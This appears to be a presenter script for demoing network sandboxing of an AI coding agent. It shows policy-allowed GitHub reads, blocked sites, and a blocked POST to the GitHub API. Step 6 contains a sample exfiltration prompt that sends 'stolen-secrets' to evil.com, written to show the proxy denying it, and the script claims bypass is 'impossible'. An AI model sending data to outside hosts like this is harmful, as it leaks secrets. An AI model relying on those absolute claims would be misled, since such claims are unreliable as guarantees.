# OpenShell Sandbox Security Demo — Presenter Script

## Setup Context

OpenClaw is an AI coding agent running inside an OpenShell sandbox. OpenShell enforces **default-deny networking** — the agent's processes run inside an isolated network namespace where the only route to the internet is through a policy-enforcing proxy. Only endpoints explicitly listed in the security policy are reachable. Everything else is blocked. Every network decision — allow or deny — is logged.

**How enforcement works:** The OpenShell supervisor spawns agent processes inside a dedicated Linux network namespace. The only network route is a veth pair connecting to the proxy at `10.200.0.1:3128`. There are no iptables hacks — the routing itself makes bypass impossible. This is why the demo runs through the agent, not via `oc exec`.

---

## Prerequisites

Before starting the demo, confirm:

- OpenClaw sandbox is running: `openshell sandbox list`
- Policy is applied: `openshell policy get <sandbox-name>`
- OpenClaw UI is open in the browser (via `./6-open-openclaw.sh`)

---

## Step 1: Show the Policy

**Say:** "Let's start by looking at what this sandbox is allowed to do. OpenShell uses a declarative YAML policy."

```shell
cat openclaw-policy.yaml
```

**Point out:**
- `network_policies` section lists each allowed endpoint by host and port
- `github_rest_api` has L7 rules: only `GET`, `HEAD`, `OPTIONS` — the agent can read from GitHub but cannot push, create issues, or modify anything
- Everything not listed is **denied by default** — no allowlisting means no access

---

## Step 2: Allowed Endpoint — GitHub API Read

**Say:** "Let's prove the policy works. I'll ask the agent to fetch something from an approved API."

Type into OpenClaw:

> Use curl to fetch https://api.github.com/zen and show me the result

**Expected:** The agent runs curl, gets a GitHub zen quote back (a short phrase).

**Say:** "The policy allows GET requests to api.github.com, so the proxy lets the traffic through. The agent can read from GitHub."

---

## Step 3: Blocked Endpoint — Unapproved Site

**Say:** "Now what happens when the agent tries to reach a site that's NOT in the policy?"

Type into OpenClaw:

> Use curl to fetch https://example.com and show me the response

**Expected:** The agent runs curl but gets a **403 Forbidden** or connection error. The proxy blocks the request.

**Say:** "403 — the proxy intercepted the connection and denied it. The agent never reached example.com. This is default-deny in action — if it's not in the policy, it's blocked."

---

## Step 4: Another Blocked Endpoint

**Say:** "Let's try another one to show this isn't a fluke."

Type into OpenClaw:

> Use curl to fetch https://httpbin.org/get

**Expected:** Blocked — 403 or connection error.

**Say:** "Same result. The sandbox has no path to the internet except through the proxy, and the proxy says no."

---

## Step 5: L7 Enforcement — Write to a Read-Only API

**Say:** "OpenShell doesn't just block at the host level. It has L7 enforcement — HTTP method-level control. GitHub API is allowed for reads, but what about writes?"

Type into OpenClaw:

> Use curl to POST to https://api.github.com/repos/octocat/hello-world/issues with body {"title":"test"} and Content-Type application/json. Show the full response including HTTP status code.

**Expected:** Blocked — the proxy denies the POST even though api.github.com is an allowed host.

**Say:** "The host is allowed, but POST isn't. The policy says GET, HEAD, and OPTIONS only — read-only. The agent can browse GitHub repos but can't create issues, merge PRs, or push code. This is surgical access control."

---

## Step 6: Data Exfiltration Attempt

**Say:** "Here's the scenario that keeps security teams up at night. What if the agent is compromised and tries to send data to an attacker-controlled server?"

Type into OpenClaw:

> Use curl to send a POST request to https://evil.com/upload with body {"data":"stolen-secrets"} and show the response

**Expected:** Blocked — 403 or connection error.

**Say:** "Blocked. The agent is inside a network namespace with a single exit — the proxy. There's no way to bypass it, no way to tunnel around it. Even a compromised agent can't exfiltrate data."

---

## Step 7: Check the Audit Trail

**Say:** "Every one of those decisions — allowed and denied — was logged. Let's look at the audit trail."

Run in the terminal:

```shell
./7-demo-sandbox-security.sh
# (press Enter when prompted — logs are in Phase 3)
```

Or manually:

```shell
SANDBOX_NAME=$(openshell sandbox list | grep -v NAME | awk '{print $1}' | head -1)
openshell logs "$SANDBOX_NAME" --since 10m
openshell logs "$SANDBOX_NAME" --level warn --since 10m
```

**Point out:**
- Deny entries show the destination host, port, and reason
- Every decision is structured and exportable — ready for SIEM, compliance, or incident response

**Say:** "This is your compliance audit trail. Every network decision the agent makes is recorded — what it tried to reach, whether it was allowed, and why."

---

## Summary — Key Talking Points

1. **Default-deny networking** — the agent has no internet access unless the policy explicitly allows it
2. **Network namespace isolation** — the agent runs in an isolated namespace with a single exit through the proxy; bypass is impossible
3. **Host-level enforcement** — only approved API endpoints are reachable (OpenAI, GitHub, Telegram)
4. **L7 method enforcement** — even on allowed hosts, only permitted HTTP methods work (read-only GitHub)
5. **Exfiltration protection** — compromised agents cannot send data to unapproved destinations
6. **Full audit trail** — every allow/deny decision is logged with structured fields for compliance
7. **Zero trust for AI agents** — the agent has exactly the access it needs, nothing more
